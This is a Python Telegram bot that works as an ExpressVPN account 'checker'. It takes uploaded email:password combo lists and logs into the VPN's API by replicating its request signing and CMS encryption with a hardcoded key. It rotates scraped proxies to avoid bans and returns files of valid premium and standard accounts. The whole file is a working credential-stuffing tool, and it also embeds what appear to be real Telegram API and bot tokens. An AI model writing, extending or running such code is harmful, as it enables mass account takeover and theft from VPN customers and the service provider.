import os, time, random, re, string, base64, gzip, json, hashlib
import asyncio, aiohttp
from datetime import datetime
from collections import deque
import concurrent.futures

from pyrogram import Client, filters
from pyrogram.errors import MessageNotModified, FloodWait

import hmac as _hmaclib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.padding import PKCS7 as CryptoPKCS7
from cryptography import x509 as crypto_x509
from asn1crypto import cms, core, x509 as asn1_x509

# === CONFIGURATION ===
API_ID = 25131184
API_HASH = "33a9391cdc79df295c4e326440e58a8c"
BOT_TOKEN = "8571867917:AAGZFmENDhdL81xCsuAg27LTsKVoQ4q7GFM"
MAX_CONCURRENCY = 150  # Absolute Maximum Speed

app = Client("express_god_tier", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# === API CONSTANTS ===
_BASE_URL = "https://www.expressapisv2.net/apis/v2"
_CLIENT_VER = "11.5.2"
_OS_NAME = "ios"
_OS_VER = "14.4"
_UA = f"xvclient/v21.21.0 ({_OS_NAME}; {_OS_VER}) ui/{_CLIENT_VER}"
_SIG_VER, _SIG_ID = "2", "91c776e"
_HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
_CERT_B64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMw"
    "EQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcN"
    "MTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29t"
    "ZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0B"
    "AQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0"
    "u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88Po"
    "cBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxe"
    "DjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86Ef"
    "nKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAd"
    "BgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/"
    "v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxX"
    "ARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iX"
    "JpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8k"
    "rF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp"
    "+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNz"
    "OuxZ4BXLe7YA=="
)

# === HEAVY CRYPTO OFF-LOADING (CPU OPTIMIZED) ===
executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)

def _aes_dec(data: bytes, key: bytes, iv: bytes) -> bytes:
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    up = CryptoPKCS7(128).unpadder()
    return up.update(dec.update(data) + dec.finalize()) + up.finalize()

def _aes_enc(data: bytes, key: bytes, iv: bytes) -> bytes:
    pad = CryptoPKCS7(128).padder()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return enc.update(pad.update(data) + pad.finalize()) + enc.finalize()

def _hmac(data: bytes) -> str: return base64.b64encode(_hmaclib.new(_HMAC_KEY.encode(), data, hashlib.sha1).digest()).decode()
def _sig(raw: str) -> str: return f"{_SIG_VER} {_hmac(raw.encode())} {_SIG_ID}"
def _bsig(b: bytes) -> str: return f"{_SIG_VER} {_hmac(b)} {_SIG_ID}"

def _cms_encrypt(data: bytes) -> bytes:
    cert_der = base64.b64decode(_CERT_B64)
    aes_key, iv = os.urandom(16), os.urandom(16)
    enc_body = _aes_enc(data, aes_key, iv)
    ccert = crypto_x509.load_der_x509_certificate(cert_der)
    enc_key = ccert.public_key().encrypt(aes_key, asym_padding.PKCS1v15())
    acert = asn1_x509.Certificate.load(cert_der)
    recip = cms.RecipientInfo({"ktri": cms.KeyTransRecipientInfo({
        "version": cms.CMSVersion(0),
        "rid": cms.RecipientIdentifier({"issuer_and_serial_number": cms.IssuerAndSerialNumber({"issuer": acert["tbs_certificate"]["issuer"], "serial_number": acert["tbs_certificate"]["serial_number"]})}),
        "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({"algorithm": "1.2.840.113549.1.1.1", "parameters": core.Null()}),
        "encrypted_key": enc_key,
    })})
    env = cms.EnvelopedData({
        "version": cms.CMSVersion(0),
        "recipient_infos": cms.RecipientInfos([recip]),
        "encrypted_content_info": cms.EncryptedContentInfo({
            "content_type": "1.2.840.113549.1.7.1",
            "content_encryption_algorithm": cms.EncryptionAlgorithm({"algorithm": "2.16.840.1.101.3.4.1.2", "parameters": core.OctetString(iv)}),
            "encrypted_content": enc_body,
        }),
    })
    return cms.ContentInfo({"content_type": "1.2.840.113549.1.7.3", "content": env}).dump()

# === PROXY ENGINE ===
async def fetch_elite_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=elite",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
    ]
    seen = set()
    pat = re.compile(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})\b")
    
    async with aiohttp.ClientSession() as s:
        for url in sources:
            try:
                async with s.get(url, timeout=5) as r:
                    seen.update(pat.findall(await r.text()))
            except: pass
    return list(seen)

# === THE CORE CHECKER ===
async def check_account(email, password, proxy, session):
    try:
        iv_b, key_b = os.urandom(16), os.urandom(16)
        iid = "".join(random.choices(string.ascii_lowercase + string.digits, k=64))
        body_j = json.dumps({"email": email, "iv": base64.b64encode(iv_b).decode(), "key": base64.b64encode(key_b).decode(), "password": password})
        
        loop = asyncio.get_running_loop()
        enc = await loop.run_in_executor(executor, _cms_encrypt, gzip.compress(body_j.encode(), compresslevel=9))
        
        qs = f"client_version={_CLIENT_VER}&installation_id={iid}&os_name={_OS_NAME}&os_version={_OS_VER}"
        headers = {
            "User-Agent": _UA, "Content-Type": "application/octet-stream", "X-Body-Compression": "gzip",
            "X-Signature": _sig(f"POST /apis/v2/credentials?{qs}"), "X-Body-Signature": _bsig(enc),
            "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"
        }
        
        px = f"http://{proxy}" if proxy else None
        
        async with session.post(f"{_BASE_URL}/credentials?{qs}", data=enc, headers=headers, proxy=px, timeout=10) as resp:
            if resp.status in (400, 401): return {"status": "BAD"}
            if resp.status == 500: return {"status": "BAN"}
            if resp.status != 200: return {"status": "ERROR"}
            content = await resp.read()

        body = await loop.run_in_executor(executor, _aes_dec, content, key_b, iv_b)
        body = body.decode("utf-8", errors="ignore")
        tok_m = re.search(r'"access_token":"([^"]+)"', body)
        if not tok_m: return {"status": "BAD"}
        
        token = tok_m.group(1)
        sub_qs = f"access_token={token}&client_version={_CLIENT_VER}&installation_id={iid}&os_name={_OS_NAME}&os_version={_OS_VER}&reason=activation_with_email"
        batch_str = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"{_sig(f"GET /apis/v2/subscription?{sub_qs}")}"}},"method":"GET","url":"/apis/v2/subscription?{sub_qs}"}}]'
        headers_b = {
            "User-Agent": _UA, "X-Body-Compression": "gzip", "X-Signature": _sig(f"POST /apis/v2/batch?{qs}"),
            "X-Body-Signature": _bsig(batch_str.encode()), "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"
        }

        async with session.post(f"{_BASE_URL}/batch?{qs}", data=batch_str, headers=headers_b, proxy=px, timeout=10) as br:
            bt = await br.text()
            
        ue = bt.encode().decode("unicode_escape", errors="replace")
        if "subscription" not in ue: return {"status": "EXPIRED"}

        exp_m = re.search(r'expiration_time":(\d+)', ue)
        exp_ts = int(exp_m.group(1)) if exp_m else 0
        now = time.time()
        
        if exp_ts and exp_ts < now: return {"status": "EXPIRED"}
        
        days_left = max(0, round((exp_ts - now) / 86400)) if exp_ts > now else 9999
        is_premium = days_left > 30 or exp_ts == 0
        
        return {
            "status": "HIT",
            "type": "PREMIUM" if is_premium else "STANDARD",
            "plan": (f"{m.group(1)} Month" if (m:=re.search(r'billing_cycle":(\d+)', ue)) else "Unknown"),
            "expire": datetime.fromtimestamp(exp_ts).strftime("%Y-%m-%d") if exp_ts else "Lifetime",
            "days": days_left if exp_ts else "Lifetime"
        }
    except:
        return {"status": "ERROR"}

# === STATE MANAGEMENT ===
class TaskManager:
    def __init__(self, total):
        self.premium, self.standard, self.expired, self.bad, self.errors, self.checked = 0, 0, 0, 0, 0, 0
        self.total = total
        self.start_time = time.time()
        self.feed = deque(maxlen=8)
        self.lock = asyncio.Lock()
        self.proxies = []
        self.dead_proxies = set()
        self.px_idx = 0

    def get_proxy(self):
        alive = [p for p in self.proxies if p not in self.dead_proxies]
        if not alive: return None
        p = alive[self.px_idx % len(alive)]
        self.px_idx += 1
        return p

def format_time(seconds):
    h, m = divmod(int(seconds), 3600)
    m, s = divmod(m, 60)
    return f"{h}h {m}m {s}s" if h > 0 else f"{m}m {s}s"

# === BOT HANDLERS ===
@app.on_message(filters.command("start"))
async def start_cmd(c, m):
    await m.reply_text("👑 **GOD-TIER EXPRESSVPN CHECKER**\n\n📌 Send a `.txt` file with combos to experience max speed.")

@app.on_message(filters.document)
async def handle_doc(c, m):
    if not m.document.file_name.endswith(".txt"): return
    status = await m.reply_text("⏳ **Initializing God-Tier Engine...**")
    
    file_path = await m.download()
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        combos = [line.strip() for line in f if ":" in line.strip()]
    os.remove(file_path)
    if not combos: return await status.edit_text("❌ No valid combos.")
    
    await status.edit_text("🌍 **Fetching Elite Proxies...**")
    state = TaskManager(len(combos))
    state.proxies = await fetch_elite_proxies()
    
    job_id = int(time.time())
    hits_file, exp_file = f"Hits_{job_id}.txt", f"Expired_{job_id}.txt"
    open(hits_file, "w").close(); open(exp_file, "w").close()

    def get_dashboard():
        elapsed = time.time() - state.start_time
        cpm = int(state.checked / (elapsed / 60)) if elapsed > 0 else 0
        pct = (state.checked / state.total) * 100 if state.total else 0
        eta = ((state.total - state.checked) / cpm * 60) if cpm > 0 else 0
        
        filled = int(pct / 100 * 15)
        bar = "█" * filled + "░" * (15 - filled)
        speed_icon = "🚀" if cpm > 500 else ("⚡️" if cpm > 100 else "🐢")
        hit_ratio = round(((state.premium + state.standard) / state.checked) * 100, 2) if state.checked else 0
        
        dash = (
            "👑 **𝐆𝐎𝐃-𝐓𝐈𝐄𝐑 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 (𝐕𝟑)** 👑\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **Progress:** `[{bar}]` {pct:.1f}%\n"
            f"📈 **Checked:** `{state.checked} / {state.total}`\n"
            f"{speed_icon} **Speed:** `{cpm}` CPM | ⏳ **ETA:** `{format_time(eta)}`\n"
            f"🎯 **Hit Ratio:** `{hit_ratio}%`\n\n"
            f"💎 **Premium:** `{state.premium}`  |  ✅ **Standard:** `{state.standard}`\n"
            f"⚠️ **Expired:** `{state.expired}`  |  ❌ **Bad:** `{state.bad}`\n\n"
            f"🛡 **Proxies:** `{len(state.proxies) - len(state.dead_proxies)} Active`\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📡 **Live Feed:**\n"
        )
        for line in reversed(state.feed): dash += f"{line}\n"
        return dash

    is_running = True
    async def ui_updater():
        while is_running:
            await asyncio.sleep(5)
            try: await status.edit_text(get_dashboard())
            except (MessageNotModified, FloodWait): pass
            except: pass

    ui_task = asyncio.create_task(ui_updater())
    sem = asyncio.Semaphore(MAX_CONCURRENCY)
    connector = aiohttp.TCPConnector(ssl=False, limit=0, ttl_dns_cache=300)

    async def worker(combo, session):
        email, pw = combo.split(":", 1)
        for attempt in range(4): # Up to 4 smart retries
            proxy = state.get_proxy()
            async with sem:
                res = await check_account(email, pw, proxy, session)

            st = res.get("status")
            if st == "ERROR":
                if proxy: state.dead_proxies.add(proxy)
                if attempt < 3: continue
            elif st == "BAN":
                if proxy: state.dead_proxies.add(proxy)
                await asyncio.sleep(1)
                continue

            async with state.lock:
                state.checked += 1
                if st == "HIT":
                    if res.get("type") == "PREMIUM":
                        state.premium += 1
                        state.feed.append(f"💎 `PREMIUM ` | `{email[:12]}...` | {res.get('days')}d")
                    else:
                        state.standard += 1
                        state.feed.append(f"✅ `STANDARD` | `{email[:12]}...` | {res.get('days')}d")
                        
                    with open(hits_file, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{pw} | Type: {res.get('type')} | Plan: {res.get('plan')} | Exp: {res.get('expire')} | Days: {res.get('days')}\n")
                elif st == "EXPIRED":
                    state.expired += 1
                    state.feed.append(f"⚠️ `EXPIRED ` | `{email[:12]}...`")
                    with open(exp_file, "a", encoding="utf-8") as f: f.write(f"{email}:{pw}\n")
                elif st == "BAD":
                    state.bad += 1
                    state.feed.append(f"❌ `BAD     ` | `{email[:12]}...`")
                else: state.errors += 1
            return

    async with aiohttp.ClientSession(connector=connector) as session:
        await asyncio.gather(*[worker(c, session) for c in combos])

    is_running = False
    ui_task.cancel()
    
    try: await status.edit_text(get_dashboard() + "\n\n🎉 **CHECKING FINISHED!**")
    except: pass

    if (state.premium + state.standard) > 0: await m.reply_document(hits_file, caption=f"✅ Total {state.premium + state.standard} Hits Found!")
    if state.expired > 0: await m.reply_document(exp_file, caption=f"⚠️ {state.expired} Expired Accounts")
    
    os.remove(hits_file); os.remove(exp_file)

if __name__ == "__main__":
    print("🚀 God-Tier ExpressVPN Checker is Online...")
    app.run()
